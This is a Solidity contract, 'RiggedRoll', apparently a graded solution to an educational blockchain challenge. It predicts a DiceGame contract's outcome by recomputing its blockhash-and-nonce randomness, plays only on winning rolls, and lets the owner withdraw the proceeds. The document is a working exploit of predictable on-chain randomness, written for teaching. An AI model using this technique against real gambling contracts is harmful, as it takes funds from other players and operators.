pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    /////////////////
    /// Errors //////
    /////////////////

    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);
    error WithdrawFailed();

    //////////////////////
    /// State Variables //
    //////////////////////

    DiceGame public diceGame;

    ///////////////////
    /// Constructor ///
    ///////////////////

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    ///////////////////
    /// Functions /////
    ///////////////////

    function riggedRoll() external {
        uint256 required = 0.002 ether;
        uint256 balance = address(this).balance;

        if(balance < required) revert NotEnoughETH(required, balance);
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();

        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        if(roll <= 5) {
            diceGame.rollTheDice{value: required}();
        } else {
            revert NotWinningRoll(roll);
        }
    }

    function withdraw (address _addr, uint256 _amount) external onlyOwner {
        uint256 balance = address(this).balance;
        if(balance < _amount) revert InsufficientBalance(_amount, balance);
        // address(this).call{}(value : _amount);
        (bool success, ) = payable(_addr).call{value: _amount}("");
        if(!success) revert WithdrawFailed();
    }

    receive() external payable {}
}
